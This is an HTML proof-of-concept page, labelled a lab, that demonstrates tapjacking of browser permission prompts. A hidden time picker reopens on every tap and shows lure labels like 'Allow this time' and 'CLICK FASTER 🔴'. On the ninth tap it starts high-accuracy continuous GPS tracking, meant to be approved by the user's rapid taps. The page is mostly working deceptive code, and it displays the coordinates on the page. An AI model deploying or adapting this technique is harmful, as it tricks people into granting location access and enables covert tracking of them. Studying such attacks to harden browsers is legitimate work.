<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Tapjacking & Double-Tap Lab</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #121212;
            color: #e0e0e0;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-end;
            min-height: 90vh;
            cursor: pointer;
        }
        h1 {
            color: #ff5252;
            font-size: 18px;
            margin-bottom: 5px;
        }
        .info-box {
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 10px;
            border-radius: 6px;
            max-width: 500px;
            width: 100%;
            font-size: 11px;
            color: #b0b0b0;
            margin-top: 15px;
            text-align: left;
            max-height: 150px;
            overflow-y: auto;
        }
        code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
        .interactive-zone {
            position: relative;
            margin-bottom: 20px;
            width: 100%;
            display: flex;
            justify-content: center;
        }
    </style>
</head>
<body>

    <h1>⚠️ Double-Tap Interaction Labss</h1>
    <p style="font-size: 12px; color: #888;">Simulasi pengujian respons klik ganda terhadap kemunculan dialog izin.</p>

    <div class="interactive-zone">
        <input id="input" type="time" list="times" style="display:none;" />
        <datalist id="times">
            <select>
                <option label="--">00:00</option>
                <option label="--">00:01</option>
                <option label="        Allow this time        ">00:02</option>
                <option label="--">00:03</option>
                <option label="--">00:04</option>
                <option label="        CLICK FASTER🔴        ">00:05</option>

                <option label="--">00:06</option>
                <option label="        CLICK FASTER 🔴        ">00:07</option>
               <option label="        CLICK FASTER 🔴        ">00:08</option>
                <option label="--">CLICK FASTER  🔴</option>
                <option label="--">CLICK FASTER  🔴</option>
            </select>
        </datalist>
    </div>

    <div class="info-box" id="log-box">
        <strong>Status Log:</strong> Menunggu interaksi klik...
    </div>

<script>
    const logBox = document.getElementById('log-box');

    function appendLog(msg) {
        console.log(msg);
        logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
        logBox.scrollTop = logBox.scrollHeight;
    }

    let clickCount = 0;
    let watchId = null;

    document.body.onclick = async () => {
        clickCount++;
        appendLog(`Ketukan ke-${clickCount} terdeteksi.`);

        try {
            // Memanggil showPicker pada setiap ketukan untuk mempertahankan konteks interaksi
            input.showPicker();
            appendLog("showPicker() berhasil dipicu pada ketukan ini.");
        } catch (e) {
            appendLog("[Ditolak oleh Sistem]: " + e.message);
        }

        // Ketika ketukan mencapai angka 9, aktifkan pelacakan posisi real-time berakurasi tinggi
        if (clickCount === 9) {
            appendLog("Batas ketukan tercapai. Memulai pelacakan real-time berakurasi tinggi...");
            
            // Konfigurasi opsi untuk memaksa keakuratan GPS maksimal
            const geoOptions = {
                enableHighAccuracy: true, // Memaksa penggunaan GPS perangkat (bukan sekadar Wi-Fi/Cell tower)
                timeout: 10000,           // Batas waktu tunggu respons (10 detik)
                maximumAge: 0             // Mencegah cache posisi lama, ambil data terbaru
            };

            // Menggunakan watchPosition agar posisi terus terpantau secara real-time
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
            }

            watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const acc = pos.coords.accuracy;
                    appendLog(`[Real-Time GPS] Lat: ${lat}, Lon: ${lon} (Akurasi: ${acc} meter)`);
                },
                (err) => { 
                    appendLog("Error / Ditolak: " + err.message); 
                },
                geoOptions
            );

            // Reset counter setelah pemicuan tercapai
            clickCount = 0;
        }
    };
</script>

</body>
</html>
